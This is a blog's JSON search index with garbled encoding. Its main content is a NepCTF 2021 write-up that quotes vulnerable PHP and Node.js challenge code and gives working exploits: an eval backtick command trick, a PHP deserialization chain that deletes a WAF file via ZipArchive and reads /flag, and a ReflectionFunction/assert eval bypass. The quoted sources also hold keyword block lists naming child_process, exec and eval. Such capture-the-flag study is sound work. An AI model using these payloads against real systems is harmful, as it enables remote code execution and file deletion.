{"meta":{"title":"Pp1ove","subtitle":null,"description":null,"author":"Pp1ove","url":"https://pp1ove.gitee.io"},"pages":[{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-01-01T13:06:03.809Z","comments":false,"path":"about/index.html","permalink":"https://pp1ove.gitee.io/about/index.html","excerpt":"","text":"[ã•ãã‚‰è˜ã®Pp1ove] ä¸&nbsp; Pp1ove&nbsp; ï¼ˆ çœŸï¼ˆã¾ï¼‰ç™½ï¼ˆã—ã‚ï¼‰ ï¼‰ å¯¹è¯ä¸­... bot_ui_ini()","keywords":"å…³äº"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"bangumi/index.html","permalink":"https://pp1ove.gitee.io/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"client/index.html","permalink":"https://pp1ove.gitee.io/client/index.html","excerpt":"","text":"ç›´æ¥ä¸‹è½½ or æ‰«ç ä¸‹è½½ï¼š","keywords":"Androidå®¢æˆ·ç«¯"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"comment/index.html","permalink":"https://pp1ove.gitee.io/comment/index.html","excerpt":"","text":"å¿µä¸¤å¥è¯— å™åˆ«æ¢¦ã€æ‰¬å·ä¸€è§‰ã€‚ ã€å®‹ä»£ã€‘å´æ–‡è‹±ã€Šå¤œæ¸¸å®«Â·äººå»è¥¿æ¥¼é›æ³ã€‹","keywords":"ç•™è¨€æ¿"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"donate/index.html","permalink":"https://pp1ove.gitee.io/donate/index.html","excerpt":"","text":"","keywords":"è°¢è°¢é¥²ä¸»äº†å–µ~"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"lab/index.html","permalink":"https://pp1ove.gitee.io/lab/index.html","excerpt":"","text":"sakuraä¸»é¢˜balabala","keywords":"Labå®éªŒå®¤"},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"tags/index.html","permalink":"https://pp1ove.gitee.io/tags/index.html","excerpt":"","text":""},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"links/index.html","permalink":"https://pp1ove.gitee.io/links/index.html","excerpt":"","text":"","keywords":"å‹äººå¸"},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-01-14T03:38:55.581Z","comments":false,"path":"theme-sakura/index.html","permalink":"https://pp1ove.gitee.io/theme-sakura/index.html","excerpt":"","text":"","keywords":"Hexo ä¸»é¢˜ Sakura ğŸŒ¸"},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-01-01T14:55:48.877Z","comments":false,"path":"music/index.html","permalink":"https://pp1ove.gitee.io/music/index.html","excerpt":"","text":"","keywords":"å–œæ¬¢çš„éŸ³ä¹"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-03-15T19:41:30.000Z","comments":true,"path":"rss/index.html","permalink":"https://pp1ove.gitee.io/rss/index.html","excerpt":"","text":""},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2020-03-15T19:41:30.000Z","comments":false,"path":"video/index.html","permalink":"https://pp1ove.gitee.io/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: 'æ”¾é€æ—¶é—´: 2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: '2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} ç•ªç»„è®¡åˆ’ è¿™é‡Œå°†æ˜¯æ°¸è¿œçš„å›å¿† window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} æ”¾é€æ—¶é—´: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"Bç«™"}],"posts":[{"title":"Nepctf","slug":"Nepctf","date":"2021-03-22T12:09:44.000Z","updated":"2021-03-26T09:58:24.492Z","comments":true,"path":"2021/03/22/Nepctf/","link":"","permalink":"https://pp1ove.gitee.io/2021/03/22/Nepctf/","excerpt":"","text":"æ˜µç§°:Pp1ove æ¯”èµ›åæ¬¡:151 åˆ†æ•° 97 little_trick&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&#39;nep&#39;]; $len = $_GET[&#39;len&#39;]; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die(&#39;too long!&#39;); } ?&gt; æˆªå–äº†$nepçš„é•¿åº¦,å¯ä»¥ä½¿ç”¨$nep=`$nep`;XXX $len=7 è¿™æ ·æˆªå–åå°±ä¼šå˜æˆ eval(&quot;`$nep`;&quot;); $nepè¢«è§£æ,æœ€ç»ˆæ‰§è¡Œeval(``$nep`;XXX`); ç„¶åæˆ‘ä»¬å¯ä»¥éšæ„ä¿®æ”¹XXXçš„å€¼æ¥æ‰§è¡Œå‘½ä»¤, ä½†æ˜¯è¿™é¢˜å¯¹é•¿åº¦æœ‰é™åˆ¶,strlen($nep)&lt;13 æˆ‘ä»¬æ§åˆ¶çš„XXXçš„é•¿åº¦å°±åº”è¯¥&lt;5 æ‰§è¡Œå‘½ä»¤ls&gt;a ,å¯ä»¥å°†lsçš„è¾“å‡ºè¾“å…¥åˆ°aæ–‡ä»¶é‡Œé¢ è®¿é—®aæ–‡ä»¶,å‘ç°ç›®å½•ä¸‹æœ‰ä¸€ä¸ªnepctf.phpæ–‡ä»¶, å†ç”¨xz *å‘½ä»¤è¿›è¡Œæ‰“åŒ…,*ä¼šåˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶,ä¸‹è½½nepctf.php.xzè·å¾—flag æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#39;shell.php&#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username=&#39;user&#39;; $this-&gt;password=&#39;user&#39;; } public function __wakeup(){ if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#39;login success you can to open shell file!&#39;); } } } class register{ public function checking($username,$password) { if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;){ die(&#39;success register admin&#39;); }else{ die(&#39;please register admin &#39;); } } } class Open{ function open($filename, $content){ if(!file_get_contents(&#39;waf.txt&#39;)){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } } } if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))){ @unserialize(base64_decode($_POST[&#39;unser&#39;])); } ç®€å•çš„ååºåˆ—åŒ–ã€‚ã€‚ã€‚ã€‚å¤§æ¦‚å§,ä¸€å¼€å§‹çš„popé“¾æŒºå¥½æ„é€ çš„, class Game { public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username = &#39;admin&#39;; $this-&gt;password = &#39;admin&#39;; $this-&gt;register = &#39;admin&#39;; $this-&gt;file = new Open(); $this-&gt;filename = &#39;shell&#39;; $this-&gt;content = &#39;&#39;; } public function __wakeup() { if (md5($this-&gt;register) === &quot;21232f297a57a5a743894a0e4a801fc3&quot;) { $this-&gt;choice = new login($this-&gt;file, $this-&gt;filename, $this-&gt;content); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username, $this-&gt;password); } } class login { } class register { } class Open { } $a = new Game(); var_dump($a); echo base64_encode(serialize($a)); å¯ä»¥æŸ¥çœ‹æºä»£ç è¯»åˆ°shell.phpæ–‡ä»¶,è¯»phpæ–‡ä»¶è¦çœ‹æºä»£ç !!!åˆç»™å¿˜äº†,å¯¼è‡´è¿™é‡Œå¡äº†åŠå¤©æ²¡ååº”è¿‡æ¥ #shell.php function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/&#39;,$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die(&#39;so long!&#39;); } } æ¥ä¸‹æ¥å°±éœ€è¦è¿›å…¥ class Open{ function open($filename, $content){ if(!file_get_contents(&#39;waf.txt&#39;)){ echo $content; shell($content); } } ä½†æ˜¯waf.txtæ–‡ä»¶æ—¶å­˜åœ¨çš„å‘€,è€Œä¸”å‚æ•°ä¸å¯æ§åˆ¶,ç›´æ¥æŠŠäººç»™æ‰“æ˜äº†,ç„¶ååˆå°è¯•äº†ä¸‹file_get_contentsé…åˆä¼ªåè®®,å‘ç°ä¹Ÿä¸è¡Œ,å¥½å­,å€’å›å»çœ‹ä¸€ä¸‹å‰é¢æ˜¯å¦æœ‰åˆ©ç”¨ç‚¹,è¿˜æœ‰ä¸ªfileå‚æ•°,å°è¯•ä¸€ä¸‹åˆ©ç”¨,è¿™é‡Œåˆ©ç”¨phpçš„å†…ç½®ç±» ,æ‰¾ä¸€ä¸‹åˆæ²¡æœ‰å†…ç½®ç±»é‡Œé¢æœ‰openæ–¹æ³• &lt;?php $classes = get_declared_classes(); foreach ($classes as $class) { $methods = get_class_methods($class); foreach ($methods as $method) { if (in_array($method, array(&#39;open&#39;))) { print $class . &#39;::&#39; . $method . &quot;\\n&quot;; } } } #æ‰¾åˆ°äº†ä¸‰ä¸ª SessionHandler::open ZipArchive::open XMLReader::open å»ç¿»äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£,å‘ç°ZipArchive::openå¯ä»¥è¿›è¡Œæ–‡ä»¶çš„overwrite, ç›´æ¥æ„é€  file=new ZipArchive(); $this-&gt;filename = &#39;waf.txt&#39;; $this-&gt;content = 8; //echoäº†ä¸€ä¸‹,ZipArchive::OVERWRITE=8 æˆåŠŸåˆ é™¤äº†waf.txt (è¿™é‡Œä¹‹å‰æˆ‘contentæ²¡æœ‰è®¾ç½®ä¸º8,è®¾ç½®çš„1,å¯èƒ½å› ä¸ºæ²¡æœ‰å…³é—­æ–‡ä»¶çš„åŸå› ,åé¢payloadä¸€ç›´æ‰“ä¸é€š,åˆ é™¤ä¸äº†æ–‡ä»¶,é‡å¯äº†ä¸€ä¸‹ç¯å¢ƒå°±å¥½äº†) æ¥ä¸‹æ¥å°±å·®æœ€åä¸€æ­¥äº†,æ‰§è¡Œå‘½ä»¤ ls / #å‘ç°æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ /flag&amp;&gt;q #å‘ç°qæ–‡ä»¶åˆ›èµ·äº†,ä½†æ˜¯é‡Œé¢æ²¡æœ‰å†…å®¹,æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹,å‘ç°æ ¼å¼ä¸ºflag={xxx}ç¡®å®ä¸ä¼šæŠ¥é”™,è‡ªå·±ä¹Ÿè¿˜æ²¡ææ¸…æ¥šæŠ¥é”™çš„åŸå›  é‡æ–°å›åˆ°æ‰§è¡Œå‘½ä»¤çš„æ€è·¯ä¸Š,å¯¹é•¿åº¦è¿›è¡Œäº†é™åˆ¶,åé¢ ç©ºæ ¼/flagåº”è¯¥æ˜¯å›ºå®šçš„,å°±çœ‹å‰é¢çš„å‘½ä»¤æœ€å¤šåªæœ‰ä¸‰ä¸ªå­—ç¬¦,n\\lä¸å°±æ˜¯ä¸‰ä¸ªå­—ç¬¦å—? ç”¨$content=&#39;n\\l /flag&#39;æˆåŠŸè¯»å–flag æœ€åé™„ä¸Šexp &lt;?php class Game { public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username = &#39;admin&#39;; $this-&gt;password = &#39;admin&#39;; $this-&gt;register = &#39;admin&#39;; $this-&gt;file = new Open(); $this-&gt;filename = &#39;&#39;; $this-&gt;content = &#39;n\\l /flag&#39;; } public function __wakeup() { if (md5($this-&gt;register) === &quot;21232f297a57a5a743894a0e4a801fc3&quot;) { $this-&gt;choice = new login($this-&gt;file, $this-&gt;filename, $this-&gt;content); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username, $this-&gt;password); } } class login { } class register { } class Open { } $a = new Game(); var_dump($a); echo base64_encode(serialize($a)); å¤ç°bbxhhå‰é¢æŒ‰ç€åšå°±è¡Œäº†,å› ä¸ºå°äº†ipéœ€è¦ä¸åœæ¢èŠ‚ç‚¹,ç„¶åä¸»è¦å¼„ä¸‹æœ€åå…³é”®çš„ä»£ç (å› ä¸ºåŸé¢˜è¦ä¸åœæ¢èŠ‚ç‚¹,å°±æ‡’å¾—å¼„äº†,ç›´æ¥æŠŠä»£ç æ”¾åˆ°æœ¬åœ°æµ‹è¯•äº†) &lt;?php function waf($s) { return preg_replace(&#39;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i&#39;, &quot;NepnEpneP&quot;, $s); } if (isset($_GET[&#39;a&#39;])) { $_ = waf($_GET[&#39;a&#39;]); $__ = waf($_GET[&#39;b&#39;]); $a = new $_($__); } else { $a = new Error(&#39;?&#39;); } if (isset($_GET[&#39;c&#39;]) &amp;&amp; isset($_GET[&#39;d&#39;])) { $c = waf($_GET[&#39;c&#39;]); $d = waf($_GET[&#39;d&#39;]); eval(&quot;\\$a-&gt;$c($d);&quot;); } else { $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\$a-&gt;$c($d);&quot;); } çœ‹wpè¯´çš„éœ€è¦ç”¨åˆ°åå°„ç±»,é‚£å°±å»å­¦å­¦ https://learnku.com/articles/7538/the-application-of-reflection-in-php https://www.php.net/manual/zh/reflectionfunction.invokeargs.php exp: &lt;?php function waf($s){ return preg_replace(&#39;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i&#39;, &quot;NepnEpneP&quot;, $s); } $a=&#39;ReflectionFunction&#39;; $b=&#39;assert&#39;; $c=&#39;invokeArgs&#39;; $d=&quot;array(&#39;show_source(\\&quot;XXX.php\\&quot;);&#39;)&quot;; if(isset($a)) { $_ = waf($a); $__ = waf($b); $a = new $_($__); } else { $a = new Error(&#39;?&#39;); } if(isset($c) &amp;&amp; isset($d)) { $c = waf($c); $d = waf($d); eval(&quot;\\$a-&gt;$c($d);&quot;); } else { $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\$a-&gt;$c($d);&quot;); } ç„¶åé‡åˆ°äº†ä¸€ä¸ªå¤§å‘,å°±æ˜¯æˆ‘ç›´æ¥F10è¿è¡Œä¼šç–¯ç‹‚æŠ¥é”™,ç»“æœæˆ‘åœ¨æµè§ˆå™¨ä¸ŠæŸ¥çœ‹çš„æ—¶å€™åˆæ²¡æœ‰é—®é¢˜ã€‚æ˜¯å› ä¸ºæˆ‘æœ¬åœ°çš„phpç¯å¢ƒä¸º7.3,è€Œassertå‡½æ•°è¢«èˆå¼ƒäº†ä¸€äº›åŠŸèƒ½ PHP &gt;= 5.4.8ï¼Œdescription å¯ä½œä¸ºç¬¬å››ä¸ªå‚æ•°æä¾›ç»™ ASSERT_CALLBACK æ¨¡å¼é‡Œçš„å›è°ƒå‡½æ•° åœ¨ PHP 5 ä¸­ï¼Œå‚æ•° assertion å¿…é¡»æ˜¯å¯æ‰§è¡Œçš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…è¿è¡Œç»“æœä¸ºå¸ƒå°”å€¼çš„è¡¨è¾¾å¼ åœ¨ PHP 7 ä¸­ï¼Œå‚æ•° assertion å¯ä»¥æ˜¯ä»»æ„è¡¨è¾¾å¼ï¼Œå¹¶ç”¨å…¶è¿ç®—ç»“æœä½œä¸ºæ–­è¨€çš„ä¾æ® åœ¨ PHP 7 ä¸­ï¼Œå‚æ•° exception å¯ä»¥æ˜¯ä¸ª Throwable å¯¹è±¡ï¼Œç”¨äºæ•è·è¡¨è¾¾å¼è¿è¡Œé”™è¯¯æˆ–æ–­è¨€ç»“æœä¸ºå¤±è´¥ã€‚(å½“ç„¶ assert.exception éœ€å¼€å¯) PHP &gt;= 7.0.0ï¼Œæ”¯æŒ zend.assertionsã€assert.exception ç›¸å…³é…ç½®åŠå…¶ç‰¹æ€§ PHP &gt;= 7.2 ç‰ˆæœ¬å¼€å§‹ï¼Œå‚æ•° assertion ä¸å†æ”¯æŒå­—ç¬¦ä¸² è¿˜æœ‰å¦ä¸€ç§è§£æ³• $c=&#39;getMessage&#39;; $d=&quot;eval(&#39;system(\\&quot;dir\\&quot;);&#39;)&quot;; è¿™é‡Œ$a=new Error(â€˜?â€™); ç„¶å$cä¸º$aä¸‹ä»»æ„ä¸€ä¸ªæ–¹æ³•,å½“æ‰§è¡Œæ—¶,ä¼šå…ˆæ‰§è¡Œeval(â€˜system(\\â€˜dir\\â€˜);â€™); systemä¼šè‡ªåŠ¨å›æ˜¾è¾“å‡º,ç„¶åå†å°†system();çš„è¿”å›å€¼ä¼ ç»™getMessageæ–¹æ³•,ç„¶åæŠ¥é”™,ä½†æ˜¯systemå·²ç»æ‰§è¡Œäº†,æ‰€ä»¥è¯´åé¢æŠ¥ä¸æŠ¥é”™å·²ç»æ— æ‰€è°“äº†ã€‚ gamejsè®¿é—®sourceè·å¾—æºç  var opn = require(&#39;opn&#39;); var express = require(&#39;express&#39;); var app = express(); var path = require(&#39;path&#39;); var bodyParser = require(&#39;body-parser&#39;); var highestScore = 40000; var FUNCFLAG = &#39;_$$ND_FUNC$$_&#39;; var serialize_banner = &#39;{&quot;banner&quot;:&quot;å¥½ï¼Œå¾ˆæœ‰ç²¾ç¥ï¼&quot;}&#39;; var flag = {&quot;flag&quot;:&quot;&quot;} // flagæ˜¯å•¥æ¥ç€ï¼Ÿè®°ä¸æ¸…äº†ã€‚ function Record() { this.lastScore = 0; this.maxScore = 0; this.lastTime = null; } var validCode = function (func_code){ let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&quot;|&#39;|\\[|\\+|\\*/ig; return !validInput.test(func_code); }; var validInput = function (input) { let validInput = /subprocess|mainModule|from|process|child_process|main|require|exec|this|function|buffer/ig; ins = serialize(input); return !validInput.test(ins); }; var merge = function (target, source) { try { for (let key in source) { if (typeof source[key] == &#39;object&#39;) { merge(target[key], source[key]); } else { target[key] = source[key]; } } } catch (e) { console.log(e); } }; var serialize = function (obj, ignoreNativeFunc, outputObj, cache, path) { path = path || &#39;$&#39;; cache = cache || {}; cache[path] = obj; outputObj = outputObj || {}; if (typeof obj === &#39;string&#39;) { return JSON.stringify(obj); } var key; for (key in obj) { if (obj.hasOwnProperty(key)) { if (typeof obj[key] === &#39;function&#39;) { var funcStr = obj[key].toString(); 